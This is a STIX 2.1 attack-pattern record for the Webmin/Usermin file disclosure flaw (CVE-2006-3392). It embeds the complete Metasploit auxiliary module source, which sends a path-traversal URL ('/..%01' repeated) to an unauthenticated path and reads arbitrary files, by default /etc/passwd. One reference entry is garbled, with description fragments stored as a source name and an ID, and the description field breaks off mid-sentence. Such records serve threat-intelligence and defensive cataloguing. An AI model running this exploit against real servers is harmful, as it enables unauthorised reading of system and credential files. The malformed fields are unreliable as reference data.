{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--206b57e4-8991-4ce7-8786-45510698becf",
    "created": "2024-08-14T16:22:37.044565Z",
    "modified": "2024-08-14T16:22:37.044569Z",
    "name": "Webmin File Disclosure",
    "description": " A vulnerability has been reported in Webmin and Usermin, which can be exploited by malicious people to disclose potentially sensitive information. The vulnerability is caused due to an unspecified error within the handling",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/webmin/file_disclosure.rb",
            "external_id": "file_disclosure.rb"
        },
        {
            "source_name": "serverviaaspeciallycraftedURL",
            "external_id": "withoutrequiringavalidlogin."
        },
        {
            "source_name": "CVE",
            "external_id": "2006-3392"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20060722192501/http://secunia.com/advisories/20892/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Webmin File Disclosure',\n      'Description'    => %q{\n        A vulnerability has been reported in Webmin and Usermin, which can be\n        exploited by malicious people to disclose potentially sensitive information.\n        The vulnerability is caused due to an unspecified error within the handling\n        of an URL. This can be exploited to read the contents of any files on the\n        server via a specially crafted URL, without requiring a valid login.\n        The vulnerability has been reported in Webmin (versions prior to 1.290) and\n        Usermin (versions prior to 1.220).\n      },\n      'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '26772'],\n          ['BID', '18744'],\n          ['CVE', '2006-3392'],\n          ['US-CERT-VU', '999601'],\n          ['URL', 'https://web.archive.org/web/20060722192501/http://secunia.com/advisories/20892/'],\n        ],\n      'DisclosureDate' => '2006-06-30',\n      'Actions'        =>\n        [\n          ['Download', 'Description' => 'Download arbitrary file']\n        ],\n      'DefaultAction'  => 'Download'\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(10000),\n        OptString.new('RPATH',\n          [\n            true,\n            \"The file to download\",\n            \"/etc/passwd\"\n          ]\n        ),\n        OptString.new('DIR',\n          [\n            true,\n            \"Webmin directory path\",\n            \"/unauthenticated\"\n          ]\n        ),\n      ])\n  end\n\n  def run\n    print_status(\"Attempting to retrieve #{datastore['RPATH']}...\")\n\n    dir = normalize_uri(datastore['DIR'])\n    uri = Rex::Text.uri_encode(dir) + \"/..%01\" * 40 + Rex::Text.uri_encode(datastore['RPATH'])\n\n    res = send_request_raw({\n      'uri'            => uri,\n    }, 10)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n      print(res.body)\n    else\n      print_status(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Matteo Cantoni <goony[at]nothink.org> ]",
        ""
    ],
    "x_mitre_disclosure_date": "2006-06-30"
}